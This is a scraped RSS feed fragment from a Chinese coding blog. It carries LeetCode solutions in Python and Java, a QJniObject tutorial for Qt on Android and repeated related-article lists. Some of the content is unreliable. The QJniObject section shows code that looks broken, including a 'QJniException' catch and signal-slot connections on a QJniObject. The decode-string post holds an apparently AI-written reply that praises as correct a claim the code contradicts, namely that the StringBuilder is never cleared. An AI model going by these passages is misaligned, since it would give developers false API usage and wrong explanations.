}void app_main(void) {i2c_master_init();//  WiFi wifi_init_sta();//  WiFi EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group, WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, portMAX_DELAY);if (bits &amp; WIFI_CONNECTED_BIT) {ESP_LOGI(TAG, "WiFi ok");//  HTTP start_webserver();} else {ESP_LOGI(TAG, "WiFi no");}
}http://www.ppmy.cn/news/1540342.html相关文章代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:44 +0000</pubDate>
    </item>
    <item>
      <title>代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素</title>
      <link>https://www.ppmy.cn/news/1540341.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素news/2025/10/31 17:52:43/LeetCode 150.逆波兰表达式求值：文章链接题目链接：150.逆波兰表达式求值思路：① 使用栈进行运算，遇到操作数入栈，遇到运算符出栈两个元素后入栈② 需要注意的是：所给的算式为string类型，需要转换为 int / long long类型后入栈；且题目要求除法为向零截断，操作数可能为负数(-2 / 3 = -1)，因此除法需要先判断操作数的正负后再进行除法运算逆波兰表达式：是一种后缀表达式，也就是运算符写在后面的表达式。比如(1 + 2) * (3 + 4) 转换为逆波兰表达式即 ( ( 1 2 + ) ( 3 4 + ) * )。优点如下：去掉括号后无歧义，即去掉括号后也可以按照次序计算出正确结果使用用栈运算：遇到数字则入栈；遇到运算符弹出栈顶两个数字进行计算，并将结果压入栈中。（第二个弹出的是第一个操作数）"""
方法1：遇到运算符后逐个判断并进行运算
"""defdiv(op1,op2):returnop1//op2ifop1*op2&gt;0else-(abs(op1)//abs(op2))classSolution(object):defevalRPN(self,tokens):""":type tokens: List[str]:rtype: int"""stack=[]op_set={'+','-','*','/'}fortokenintokens:iftokennotinop_set:stack.append(int(token))else:op2=stack.pop()op1=stack.pop()# 第二个弹出的为第一个操作数iftoken=='+':stack.append(op1+op2)eliftoken=='-':stack.append(op1-op2)eliftoken=='*':stack.append(op1*op2)else:stack.append(div(op1,op2))returnstack.pop()"""
方法2：借用operator库和字典实现字符运算符到实际的函数运算
"""fromoperatorimportadd,sub,muldefdiv(op1,op2):returnint(op1/op2)ifop1*op2&gt;0else-(abs(op1)//abs(op2))classSolution(object):op_map={'+':add,'-':sub,'*':mul,'/':div}defevalRPN(self,tokens):stack=[]fortokenintokens:iftokennotinself.op_map:stack.append(int(token))else:op2=stack.pop()op1=stack.pop()# 后出现的为第一个操作数stack.append(self.op_map[token](op1,op2))returnstack.pop()感悟：需要注意细节：将操作数转换为整数类型，第二个弹出的为第一个操作数，正负数的向零截取除法LeetCode 239.滑动窗口最大值：文章链接题目链接：239.滑动窗口最大值思路：使用队列保存窗口中的元素，那么滑动窗口的最大值由队列中得到，那么维持一个单调队列，最大值为队首元素，但是push和pop需要对队列进行调整比较麻烦。那么维持一个“单调双端队列”① push (value)，若队尾元素 &lt; value，出队队尾元素直到其值 &gt;= value，从而维持了队列的单调。且需要返回的为滑动窗口最大值，要么出队的元素中没有队首最大值，对返回值无影响；要么出队元素中有队首最大值，那么value成为队首最大值。② pop(value)，队首出队，由于push时将 &lt; push_value的值全部出队了，且出队只能出队首元素，因此value == 队首元素时才出队。（若value &lt; queue.front()，那么该元素在push时已经出队，且对于滑动窗口的最大值无影响；value &gt; queue.front()，这种情况不存在）fromcollectionsimportdequeclassMyqueue(object):def__init__(self):self.queue=deque()# 使用双端队列构造单调队列，左队头，右队尾defpop(self,value):# 当弹出元素为队首元素时才弹出ifself.queueandvalue==self.front():self.queue.popleft()defpush(self,value):# push元素到队尾，为了保持单调队列；一直弹出队尾元素直到队尾元素 &gt;= valuewhileself.queueandself.queue[-1]&lt;value:self.queue.pop()self.queue.append(value)# 队首元素即窗口的最大元素deffront(self):returnself.queue[0]classSolution(object):defmaxSlidingWindow(self,nums,k):""":type nums: List[int]:type k: int:rtype: List[int]"""queue=Myqueue()result=[]# 将前k个加入单调队列中foriinrange(k):queue.push(nums[i])result.append(queue.front())# 保存每个窗口的最大值foriinrange(k,len(nums)):queue.pop(nums[i-k])queue.push(nums[i])result.append(queue.front())returnresult感悟：“单调”双端队列的一种实现和利用LeetCode 347.前K个高频元素：文章链接题目链接：347.前K个高频元素思路：① 统计并记录元素的频率和元素本身：map② 对元素频率进行排序③ 根据排序后的元素频率得到前 k 个高频元素采用大小为 k 的优先级队列，其中优先级为频率。使用大小为 k 的小根堆实现该优先级队列（每次压入元素时，直接从堆顶弹出最小值，然后压入元素，从而留下的 k 个元素为频率前 k 的元素）。需要注意的是python中使用heapq包来实现小根堆。heapqpush(pri_que, value)只能根据value元素建立小根堆（想建立大根堆的话使用value的负值建立小根堆，输出元素时再取负值）。建立优先级队列为heappush(pri_que, (pri, value))，根据 pri 在 pri_que中建立最小堆importheapqclassSolution(object):deftopKFrequent(self,nums,k):""":type nums: List[int]:type k: int:rtype: List[int]"""# 统计频率map_num={}fornuminnums:map_num[num]=map_num.get(num,0)+1# 构造大小为k的小根堆得到频率前 k 高的元素pri_que=[]fornum,freinmap_num.items():iflen(pri_que)&lt;k:heapq.heappush(pri_que,(fre,num))eliffre&gt;pri_que[0][0]:heapq.heappop(pri_que)heapq.heappush(pri_que,(fre,num))# 倒序存储堆弹出的元素result=[0]*kforiinrange(k-1,-1,-1):result[i]=heapq.heappop(pri_que)[1]returnresult"""
方法2：转换字典为fre_num，然后单独对频率进行排序并取排序后前 k 个高频元素
"""fromcollectionsimportdefaultdictclassSolution(object):deftopKFrequent(self,nums,k):# 统计频率map_num={}fornuminnums:map_num[num]=map_num.get(num,0)+1# 反转字典 (fre: num)fre_num=defaultdict(list)fornum,freinmap_num.items():fre_num[fre].append(num)# 对频率进行排序fre_key=list(fre_num.keys())fre_key.sort(reverse=True)# 取出现频率前 k 高的元素result=[]cnt,i=0,0whilecnt&lt;k:result+=fre_num[fre_key[i]]cnt+=len(fre_num[fre_key[i]])i+=1returnresult感悟：优先级队列的实现和字典的反转学习收获：① 学会了使用小根堆实现优先级队列② 学会了“单调”双端队列的一种实现http://www.ppmy.cn/news/1540341.html相关文章Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:43 +0000</pubDate>
    </item>
    <item>
      <title>Leetcode 字符串解码</title>
      <link>https://www.ppmy.cn/news/1540340.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Leetcode 字符串解码news/2025/10/31 17:52:42/该代码的算法思想可以分为以下几个步骤：1.使用栈来处理嵌套结构：我们需要处理像k[encoded_string]这种格式，其中的encoded_string可能是嵌套的，即像3[a2[c]]这样的输入。因此，我们可以借助栈（Stack）来记录每一层的状态，处理嵌套的情况。2.两个栈来分别保存重复次数和当前字符串：countStack: 用来保存当前需要重复的次数k。每遇到一个[，就表示有一个新的重复次数需要记录下来。resultStack: 用来保存每次遇到[之前生成的字符串（即之前的部分字符串），以便遇到]时能把当前处理的部分和之前的部分结合起来。3.遍历字符串并根据字符类型进行处理：数字：当遇到数字时，可能会有多位数字组合在一起（例如 “10” 或 “100”），因此需要将完整的数字解析出来，并将它压入countStack。左括号[：当遇到[时，表示进入一个新的子问题，将当前已生成的字符串result存入resultStack，并将result重置为空字符串，准备处理括号内的部分。右括号]：当遇到]时，说明当前括号内的子字符串已经生成完毕，应该将其重复相应的次数（根据countStack中的值），然后将重复后的结果与之前保存的部分字符串拼接起来。字母：如果当前字符是字母（既不是数字，也不是括号），则直接将其附加到当前的result中。4.算法流程：代码从头到尾遍历字符串：遇到数字时解析出完整的数字，并压入countStack。遇到[时，将当前字符串保存到resultStack并清空result。遇到]时，弹出countStack和resultStack的内容，生成重复的字符串并拼接起来。遇到普通字符时，将其附加到当前的result中。5.最终结果：遍历完所有字符后，result中存储的就是最终解码后的字符串。例子分析：以输入s = "3[a2[c]]"为例：首先解析出数字3，然后遇到[，将当前的result（空字符串）压入resultStack。继续遇到a，将其加到result中。然后遇到2，解析出数字2，遇到[，将当前的result(a) 压入resultStack。遇到c，将其加到result中，接着遇到]，从countStack中弹出2，将c重复两次并与resultStack中的a拼接，得到acc。最后遇到]，将acc重复三次，得到最终结果accaccacc。复杂度分析：时间复杂度: 每个字符都被处理一次，因此时间复杂度为 O(n)，其中 n 是输入字符串的长度。空间复杂度: 由于使用了栈来存储中间结果，最坏情况下栈的深度为嵌套层数，因此空间复杂度也是 O(n)。这样设计的算法能高效处理带有多层嵌套和重复的字符串解码问题。classSolution{publicStringdecodeString(Strings){Stack&lt;Integer&gt;countStack=newStack&lt;&gt;();Stack&lt;String&gt;resultStack=newStack&lt;&gt;();intindex=0;Stringresult="";while(index&lt;s.length()){if(Character.isDigit(s.charAt(index))){intcount=0;while(Character.isDigit(s.charAt(index))){count=count*10+(s.charAt(index)-'0');//将连续数字字符转换为int数值index++;//注意,index的位置是在while循环内部更新，而不是while循环外部}countStack.push(count);}elseif(s.charAt(index)=='['){resultStack.push(result);result="";index++;}elseif(s.charAt(index)==']'){StringBuildertemp=newStringBuilder(resultStack.pop());intrepeatTimes=countStack.pop();for(inti=0;i&lt;repeatTimes;++i){temp.append(result);//temp一直在append并没有被清空过}//result 是增量式变化result=temp.toString();index++;}else{result=result+s.charAt(index);index++;}}returnresult;}}为什么在遇到[时，将当前字符串保存到 resultStack 并清空 result，这是因为第一次遇到[时，当前字符串是空串""，除了第一次，之后每次遇到[时，当前字符串都是上一个[]中的完整字符串，所以需要将当前字符串保存到 resultStack 并清空 result你理解得非常正确！在遇到[时，将当前字符串保存到resultStack并清空result是算法中的一个关键步骤，原因可以从以下几个方面解释：1.处理嵌套结构：每次遇到[时，说明即将开始处理一个新的子字符串，而当前的result中已经存储了上一个部分（或者是空串，如果是第一次遇到[）。为了确保可以正确地将嵌套结构解析并组合在一起，需要先将当前的result暂时保存起来，等待后续处理完括号内的子字符串后再恢复。2.保存当前结果用于拼接：第一次遇到[时，当前的result可能是空串""，因为还没有处理到任何有效的字符。将空串压入resultStack只是为了保持结构一致。之后每次遇到[时，当前的result已经包含了在之前解析的字符串。例如，对于输入"2[abc]3[cd]ef"，当处理到3[时，result可能是"abcabc"，这时需要将它保存到resultStack，以便之后拼接cd重复的部分。3.清空result以处理括号内的新内容：每次遇到[后，新的字符串解析会从括号内部的内容开始，因此必须将result清空，确保解析的新字符串（括号内的部分）不会与之前的内容混在一起。这样做的目的是为每一对[]保持独立的处理状态。例子解释：假设我们处理字符串s = "2[abc]3[cd]ef"：遇到2，我们解析出count = 2。遇到[，我们把当前的result（空串）压入resultStack，然后清空result，为接下来解析abc做准备。解析到abc，此时result = "abc"。遇到]，我们从resultStack中弹出空串，重复abc两次，得到"abcabc"，并将其保存到result。继续处理3[cd]时，result = "abcabc"，我们需要保存它，因此再次遇到[时，将"abcabc"压入resultStack，清空result以解析cd。解析cd完成后，我们将result = "cdcdcd"与之前的"abcabc"拼接，得到"abcabccdcdcd"。最后，添加ef，得到最终结果"abcabccdcdcdef"。总结：每次遇到[时，将当前的result保存到resultStack，并清空result是为了：确保每个括号对内的字符串能够独立解析。保证括号内的字符串能够正确重复并与之前的部分拼接。这一步处理使得代码可以正确解析嵌套和连续的编码字符串。之所以使用StringBuilder temp, 是因为temp一直在append并且temp不会被清空，所以result = temp.toString();是增量式变化的是的，完全正确！你对StringBuilder temp的使用理解非常到位。使用StringBuilder和temp.append(result)是为了增量式地构建字符串，并且temp不会在每次循环中被清空，它会逐步构建最终的解码结果。具体原因如下：1.StringBuilder提供高效的字符串拼接操作：StringBuilder是 Java 中用于高效处理字符串拼接的类，因为它不像String那样每次拼接都会创建一个新的字符串对象。使用StringBuilder可以避免频繁创建新对象，提升性能，特别是在循环中拼接大量字符串的情况下。2.temp用于存储多次拼接后的结果：在while循环中，当遇到]时，会把resultStack中保存的上一级的字符串取出，并将当前解析的result重复多次后，拼接回到temp中。每次进入这个步骤时，temp会不断通过temp.append(result)增量式地拼接新的部分，而不会被清空。注意：result只存储当前括号内的部分，而temp逐渐积累最终结果。3.增量式的变化：每次遇到]时，temp.append(result)的结果会不断累积。然后使用result = temp.toString();将temp中的累积结果转换回String类型并赋给result，继续后续的处理。temp不会在循环中被清空，因此它能够保存之前的拼接结果，从而实现增量式的构建。例子分析：假设输入是s = "3[a2[c]]"，解析过程如下：解析到3[，开始处理a2[c]，此时result = ""。解析到a，result = "a"。解析到2[c]，进入内层括号，先把result = "a"压入resultStack，然后清空result准备处理c。解析到c，result = "c"，之后遇到]，弹出2，将c重复两次，得到cc，将其与resultStack中的"a"拼接，生成temp = "acc"。最后，处理3[]的外层，弹出3，将"acc"重复三次，通过temp.append(result)得到accaccacc，最终将其赋值给result。因此，temp是不断积累的，而result在不同层次的括号内会被清空并重新构建，这样的设计确保了各层括号中的字符串能够正确拼接到一起。总结：StringBuilder temp用来增量式地拼接字符串，每次重复操作后都把结果追加到temp，这样可以避免频繁创建新对象，并且不会在循环中被清空。result = temp.toString();只是把StringBuilder中的累积结果转换成字符串后继续后续的处理。这种设计确保每层括号解析完后，拼接结果能够累积并正确组合，最终得到完整的解码字符串。http://www.ppmy.cn/news/1540340.html相关文章QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:42 +0000</pubDate>
    </item>
    <item>
      <title>QJniObject--Qt中的Java交互类</title>
      <link>https://www.ppmy.cn/news/1540339.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维QJniObject--Qt中的Java交互类news/2025/10/31 17:52:41/QJniObjectQJniObject是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口，使得 C++ 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是QJniObject的一些主要用途：1. 调用 Java 方法QJniObject允许你从 C++ 代码中调用 Java 方法。通过这种方式，你可以利用 Java 提供的功能，而无需完全用 C++ 重新实现。QJniObjectjavaObject("com/example/MyJavaClass");javaObject.callMethod&lt;void&gt;("myJavaMethod");2. 创建 Java 对象你可以使用QJniObject创建 Java 对象，并在 C++ 代码中操作这些对象。QJniObjectjavaObject("com/example/MyJavaClass","(I)V",42);// 调用构造函数，传入一个整数参数3. 访问 Java 字段QJniObject允许你访问 Java 对象的字段，包括读取和写入操作。QJniObjectjavaObject("com/example/MyJavaClass");intfieldValue=javaObject.getField&lt;int&gt;("myField");javaObject.setField("myField",123);4. 处理 Java 异常QJniObject提供了处理 Java 异常的机制，使得你可以在 C++ 代码中捕获和处理 Java 代码抛出的异常。try{QJniObjectjavaObject("com/example/MyJavaClass");javaObject.callMethod&lt;void&gt;("methodThatThrows");}catch(constQJniException&amp;e){qWarning()&lt;&lt;"Caught Java exception:"&lt;&lt;e.what();}5. 与 Android 平台特定 API 交互在开发 Android 应用时，你可能需要访问一些 Android 平台特定的 API，例如访问设备传感器、相机、位置服务等。通过QJniObject，你可以从 C++ 代码中调用这些 API。QJniObject context=QtAndroid::androidContext();QJniObject locationService=context.callObjectMethod("getSystemService","(Ljava/lang/String;)Ljava/lang/Object;",QJniObject::fromString("location").object&lt;jstring&gt;());6. 与 Qt 信号槽机制集成你可以将QJniObject与 Qt 的信号槽机制结合使用，以实现更复杂的交互逻辑。例如，当 Java 代码触发某个事件时，可以调用 C++ 代码中的槽函数。QJniObjectjavaObject("com/example/MyJavaClass");connect(&amp;javaObject,SIGNAL(javaSignal()),this,SLOT(cppSlot()));总结QJniObject是一个非常强大的类，它使得在 Qt for Android 中使用 Java 代码变得更加简单和直观。通过QJniObject，你可以在 C++ 代码中创建和操作 Java 对象、调用 Java 方法、访问 Java 字段以及处理 Java 异常，从而充分利用 Java 和 Android 平台提供的功能。http://www.ppmy.cn/news/1540339.html相关文章闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
